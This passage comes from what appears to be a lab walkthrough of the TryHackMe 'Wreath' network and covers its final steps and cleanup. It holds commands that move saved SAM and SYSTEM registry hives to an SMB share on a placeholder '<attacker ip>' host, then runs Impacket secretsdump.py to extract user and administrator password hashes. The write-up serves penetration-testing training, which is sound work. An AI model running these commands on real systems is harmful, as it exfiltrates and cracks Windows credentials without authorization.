</span></span></code></pre></div><p><img src=/assets/img/Wreath144.png alt="Wreath save registry"></p><p>Once saved, reconnect to our attacker SMB share as shown in the previous step, and move these two files to that share.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>move sam.bak \\&lt;attacker ip&gt;\share\sam.bak
</span></span><span style=display:flex><span>move system.bak \\&lt;attacker ip&gt;\share\system.bak
</span></span></code></pre></div><p>Next, disconnect the SMB server as you did before and complete this question. To answer the fourth question, let&rsquo;s run:</p><p><code>python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL</code></p><p>This will dump all the hashes for the users, including the administrator hash which is the answer to this question.</p><p><img src=/assets/img/Wreath145.png alt="Wreath Impacket secretsdump.py"></p><p>At this point, we have proof we&rsquo;ve owned this network. Perform cleanup on all the systems by deleting the various tools/exploits on the three hosts. Once done, mark this as complete.</p><h3 id=task-45-conclusion-debrief--report>Task 45 [Conclusion] Debrief & Report
